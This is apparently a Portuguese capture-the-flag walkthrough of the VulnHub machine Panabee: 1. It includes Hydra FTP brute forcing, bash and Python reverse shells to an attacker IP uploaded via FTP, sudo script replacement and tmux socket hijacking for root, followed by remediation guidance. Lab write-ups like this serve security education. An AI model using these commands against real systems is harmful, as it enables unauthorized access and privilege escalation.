# Panabee: 1 — Notas SMB, Força Bruta no FTP e a Sessão tmux do Root

Bora rapaziada!! Panabee: 1 é uma máquina de múltiplos serviços que te acerta com uma cadeia que a maioria não espera: nota SMB com usuário, força bruta FTP, caminho de execução de backup do diretório home para foothold, movimento lateral via sudo para script Python, e então a cereja do bolo: uma sessão tmux do root com socket acessível a todos esperando para ser conectada. O sequestro de socket tmux para root é uma das técnicas de privesc mais limpas e realistas que você vai aprender, sem exagero.

Salve ao criador por construir uma cadeia de múltiplos estágios realista. Cada serviço é relevante, nada é isca. gg.

---

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Panabee: 1 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/panabee-1,424/ |
| **Técnicas** | Nmap, enumeração SMB (smbclient), força bruta FTP (Hydra), execução de backup do diretório home, movimento lateral via substituição de script Python com sudo, monitoramento de processos com pspy, sequestro de socket tmux |
| **CVEs** | CWE-269 (Gerenciamento Impróprio de Privilégios: socket tmux acessível a todos), CWE-284 (Controle de Acesso Impróprio: diretório home FTP gravável), CWE-732 (Atribuição Incorreta de Permissão: script sudo gravável pelo usuário) |
| **Grupos APT** | APT41: uso documentado de enumeração SMB e exploração FTP como vetores de acesso inicial em ambientes corporativos; FIN7: usa força bruta de credenciais contra serviços FTP expostos e movimento lateral por execução de scripts em cadeias de intrusão de múltiplos estágios |

---

## Resumo do Ataque

```
nmap: FTP 21 + SSH 22 + SMTP 25 + HTTP 80 + SMB 139/445
    |
    v
smbclient: compartilhamento 'note' -> note.txt -> usuário: goper
    |
    v
hydra força bruta FTP: goper:spiderman
    |
    v
login FTP -> get status.py -> mecanismo de backup auto-executa arquivos do home
    |
    v
criar backup.sh (reverse shell) -> ftp put backup.sh -> listener nc porta 8080
    |
    v
shell como goper -> sudo -l: (jenny) NOPASSWD: python3 /home/goper/status.py
    |
    v
substituir status.py por reverse shell Python -> ftp put status.py
    |
    v
sudo -u jenny python3 /home/goper/status.py -> listener nc porta 8888
    |
    v
shell como jenny -> pspy: sessão tmux root em /opt/.tmux-0/sockets/default
    |
    v
tmux -S /opt/.tmux-0/sockets/default attach -> uid=0(root)
    |
    v
cat /root/proof.txt
```

---

## Metodologia

1. Varredura completa de portas: identificar todos os serviços (FTP, SSH, SMTP, HTTP, SMB)
2. Enumeração SMB por sessão nula: recuperar note.txt revelando usuário goper
3. Força bruta FTP contra goper com Hydra
4. Enumeração FTP: baixar status.py, entender o mecanismo de backup
5. Upload de backup.sh malicioso via FTP para execução de código como goper
6. Estabilização do shell
7. Enumeração sudo: identificar caminho para jenny via script Python
8. Substituir status.py por reverse shell Python; executar via sudo
9. Monitoramento de processos com pspy para descobrir sessão tmux root
10. Attach ao socket tmux para root

---

## Passo 1 — Descoberta de Host e Varredura Completa de Portas

```bash
nmap -p- -A 192.168.0.165
```

**Portas abertas:**

| Porta | Serviço | Observações |
|---|---|---|
| 21 | FTP | vsftpd |
| 22 | SSH | OpenSSH |
| 25 | SMTP | Postfix |
| 80 | HTTP | Apache (página padrão) |
| 139/445 | SMB | Samba |

HTTP na 80 mostra a página padrão do Apache. HTTP provavelmente é beco sem saída. SMB e FTP são a superfície de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração SMB

```bash
smbclient -L \\\\192.168.0.165
```

Um compartilhamento chamado `note` está visível. Conectar e recuperar o arquivo:

```bash
smbclient \\\\192.168.0.165\\note
smb: \> ls
smb: \> get note.txt
smb: \> exit

cat note.txt
```

A nota é endereçada ao usuário `goper` e menciona que o servidor faz backup de arquivos do diretório home de goper. Duas informações de inteligência: um nome de usuário e uma descrição de um mecanismo de execução de código.

**Nota real:** Compartilhamentos SMB legíveis são consistentemente encontrados em redes corporativas. Notas internas, backups de configuração e documentos de onboarding frequentemente contêm nomes de usuários, detalhes do servidor e dicas sobre mecanismos de backup. O APT41 enumera sistematicamente compartilhamentos SMB durante a fase de descoberta de intrusões contra alvos corporativos.

**MITRE ATT&CK:** T1021.002 — Serviços Remotos: SMB; T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Força Bruta FTP

```bash
hydra -l goper -P /usr/share/wordlists/rockyou.txt \
  192.168.0.165 ftp -t 4
```

Credenciais encontradas: `goper:spiderman`

A senha `spiderman` é uma entrada comum no rockyou.txt. Senhas FTP fracas em máquinas que também rodam SMB e SSH representam uma superfície de risco significativa.

**MITRE ATT&CK:** T1110.001 — Força Bruta: Adivinhação de Senha

---

## Passo 4 — Enumeração FTP

```bash
ftp 192.168.0.165
# Usuário: goper
# Senha: spiderman

ftp> ls
ftp> get status.py
ftp> bye

cat status.py
```

`status.py` é um script Python que faz ping em um host e escreve o status no diretório home de jenny. Ele roda como jenny via sudo. O diretório FTP é o diretório home de goper e qualquer coisa colocada aqui é acessível ao mecanismo de backup.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1552.001 — Credenciais em Arquivos

---

## Passo 5 — Foothold via Execução de Backup do Diretório Home

O mecanismo de backup auto-executa scripts colocados no diretório home de goper. Criar um reverse shell:

```bash
cat > /tmp/backup.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.0.147/8080 0>&1
EOF
```

Iniciar listener:

```bash
nc -lvnp 8080
```

Upload via FTP:

```bash
ftp 192.168.0.165
# goper:spiderman
ftp> put /tmp/backup.sh backup.sh
ftp> bye
```

O mecanismo de backup executa `backup.sh`. Um shell chega como `goper`.

Estabilizar o shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

**MITRE ATT&CK:** T1059.004 — Interpretador de Comandos: Shell Unix; T1190 — Explorar Aplicação Pública

---

## Passo 6 — Movimento Lateral: goper para jenny

```bash
sudo -l
# (jenny) NOPASSWD: /usr/bin/python3 /home/goper/status.py
```

A regra sudo permite rodar `python3 /home/goper/status.py` como jenny sem senha. O detalhe crítico: `status.py` está no diretório home de goper, que goper controla. Substituir por reverse shell:

```bash
cat > /tmp/status.py << 'EOF'
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.147", 8888))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF
```

Upload via FTP:

```bash
ftp 192.168.0.165
# goper:spiderman
ftp> put /tmp/status.py status.py
ftp> chmod 777 status.py
ftp> bye
```

Iniciar listener na porta 8888 e executar:

```bash
nc -lvnp 8888

sudo -u jenny /usr/bin/python3 /home/goper/status.py
```

Shell recebido como jenny. Caramba!

**Nota real:** Regras sudo apontando para arquivos graváveis pelo usuário são uma descoberta crítica de escalação de privilégios. O padrão "NOPASSWD: /usr/bin/python3 /home/user/script.py" onde script.py é gravável pelo usuário é equivalente a dar ao usuário sudo irrestrito para python3. Essa classe de má configuração aparece consistentemente em auditorias de segurança Linux corporativas.

**MITRE ATT&CK:** T1548.003 — Abuso de Mecanismo de Elevação: Sudo; T1059.006 — Interpretador de Comandos: Python

---

## Passo 7 — Monitoramento de Processos com pspy

```bash
cd /tmp
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

Saída do pspy revela um processo tmux do root com socket em `/opt`:

```
CMD: UID=0 ... tmux -S /opt/.tmux-0/sockets/default
```

A sessão tmux está rodando como root e o socket é acessível. Este é um caminho direto para root.

**MITRE ATT&CK:** T1057 — Descoberta de Processo

---

## Passo 8 — Sequestro de Socket tmux para Root

```bash
export TERM=xterm
tmux -S /opt/.tmux-0/sockets/default attach
```

Um shell root é obtido ao conectar à sessão tmux existente. As permissões do socket permitem que jenny o acesse e conecte.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cd /root
cat proof.txt
```

(☞ﾟヮﾟ)☞ Root via socket tmux. Isso é elegante demais, véi.

**Nota real:** Sequestro de socket tmux e screen é uma técnica documentada de escalação de privilégios. Quando um usuário de alto privilégio cria uma sessão tmux e o socket é colocado em um diretório acessível a todos, qualquer usuário que consiga alcançar o socket pode conectar à sessão e herdar o contexto daquele usuário.

**MITRE ATT&CK:** T1609 — Comando de Administração de Container (análogo: sequestro de sessão tmux); T1548 — Abuso de Mecanismo de Elevação de Controle

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| Nome de usuário | `goper` | note.txt no compartilhamento SMB | Alvo da força bruta FTP |
| Credencial | `goper:spiderman` | Força bruta Hydra FTP | Acesso FTP + execução de backup |
| Flag root | `proof.txt` | `/root/proof.txt` | Sequestro de socket tmux |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Principal Aprendizado |
|---|---|---|---|
| 1 | Compartilhamento SMB legível expondo usuário na nota | Documentação interna em compartilhamentos SMB é fonte consistente de reconhecimento para atacantes | Restringir compartilhamentos SMB; não armazenar nomes de usuários ou detalhes operacionais em arquivos legíveis |
| 2 | Senha FTP fraca (spiderman) | Palavras comuns de dicionário são trivialmente crackeadas; força bruta FTP é técnica padrão de descoberta | Aplicar política de senha forte; desabilitar FTP se SFTP estiver disponível |
| 3 | Diretório home gravável com auto-execução de backup | Mecanismos de backup que executam arquivos controlados pelo usuário com privilégio maior são caminhos diretos de execução de código | Auditar todos os mecanismos de backup; nunca auto-executar arquivos de locais controlados pelo usuário |
| 4 | Regra sudo apontando para script gravável pelo usuário | Equivalente a sudo irrestrito para aquela linguagem; documentado em avisos CISA de hardening Linux | Definir propriedade root:root com modo 750 para scripts chamados via sudo; scripts devem ser imutáveis ao usuário alvo do sudo |
| 5 | Socket tmux acessível para sessão root | Sequestro de socket tmux/screen é ataque documentado; sessões root nunca devem ter sockets acessíveis a todos | Criar sessões tmux em diretórios privados; garantir modo de socket 0600 |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Descoberta | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso Inicial | Acesso a Credenciais | Força Bruta: Adivinhação de Senha | T1110.001 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SMB | T1021.002 |
| Execução | Execução | Interpretador de Comandos: Shell Unix | T1059.004 |
| Execução | Execução | Interpretador de Comandos: Python | T1059.006 |
| Descoberta | Descoberta | Descoberta de Processo | T1057 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Controle de Elevação: Sudo | T1548.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Elevação de Controle | T1548 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Restringir acesso ao compartilhamento SMB:** exigir autenticação para todos os compartilhamentos; não expor notas operacionais internas via SMB
2. **Aplicar senhas fortes no FTP:** mínimo 12 caracteres, requisitos de complexidade; ou desabilitar FTP e usar SFTP com autenticação por chave
3. **Auditar mecanismos de backup:** nunca auto-executar arquivos de diretórios controlados pelo usuário; destinos de backup devem ser de propriedade root e graváveis apenas pelo root
4. **Corrigir regra sudo apontando para script gravável pelo usuário:** `chown root:root /home/goper/status.py && chmod 750 /home/goper/status.py`
5. **Restringir permissões de socket tmux:** criar sessões tmux com socket em diretório privado do root; garantir modo de socket 0600

### Contramedidas MITRE D3FEND

- **D3-ACH**: Hardening de Configuração de Aplicação (restringir sessões nulas SMB; desabilitar acesso FTP anônimo)
- **D3-OAM**: Gerenciamento Administrativo do SO (propriedade do script sudo; permissões de socket tmux)
- **D3-NTF**: Filtragem de Tráfego de Rede (firewall SMB e FTP para hosts autorizados)
- **D3-PA**: Autenticação por Senha (política de senha FTP forte)

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Inventariar todos os serviços FTP, SMB e SMTP; auditar permissões de compartilhamento e mecanismos de backup |
| Proteger | Controle de Acesso | Restringir acesso ao compartilhamento SMB; senhas FTP fortes; corrigir permissões de script sudo |
| Proteger | Segurança de Dados | Remover nomes de usuários e detalhes operacionais de arquivos em compartilhamentos SMB |
| Detectar | Anomalias e Eventos | Alertar sobre tentativas de força bruta FTP; monitorar anomalias de processo detectáveis pelo pspy |
| Responder | Planejamento de Resposta | Rotacionar credenciais de goper; revogar sessões tmux não autorizadas; auditar regras sudo |
| Recuperar | Planejamento de Recuperação | Reconstruir a partir de imagem conhecida e boa; auditar todas as contas e regras sudo |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restringir acesso SMB e FTP; exigir autenticação |
| AC-6 | Menor Privilégio | Corrigir regra sudo; socket tmux restrito ao root |
| CM-6 | Configurações | Restringir sessões nulas SMB; corrigir permissões de diretório FTP |
| CM-7 | Funcionalidade Mínima | Desabilitar FTP se SFTP estiver disponível; remover compartilhamentos SMB com dados sensíveis |
| IA-5 | Gerenciamento de Autenticadores | Aplicar complexidade de senha em contas FTP |
| AU-2 | Log de Eventos | Registrar tentativas de autenticação FTP; monitorar uso do sudo |

### CISA KEV

As técnicas de enumeração SMB e força bruta FTP estão cobertas no Alerta CISA AA22-074A sobre exploração de serviços expostos à internet. Padrões de má configuração sudo são abordados nas orientações de hardening Linux da CISA. Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI | MIL2 |

---

## Considerações Finais

Panabee: 1 é uma máquina realista de múltiplos estágios que ensina disciplina de enumeração de serviços e pensamento em cadeia de escalação. O sequestro de socket tmux para root é particularmente memorável: é uma técnica elegante e de baixo ruído que contorna sudo, SUID e caminhos de exploit de kernel completamente. Qualquer pentester que ainda não viu abuso de socket tmux deve estudar essa aqui com cuidado.

O passo do pspy também é valioso: desenvolver o hábito de rodar pspy em toda máquina que você comprometer é uma habilidade que vai render dividendos em engajamentos reais. Processos rodando como outros usuários, jobs cron e sessões compartilhadas são frequentemente invisíveis para o output padrão do `ps`.

Continuem encadeando, mano. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
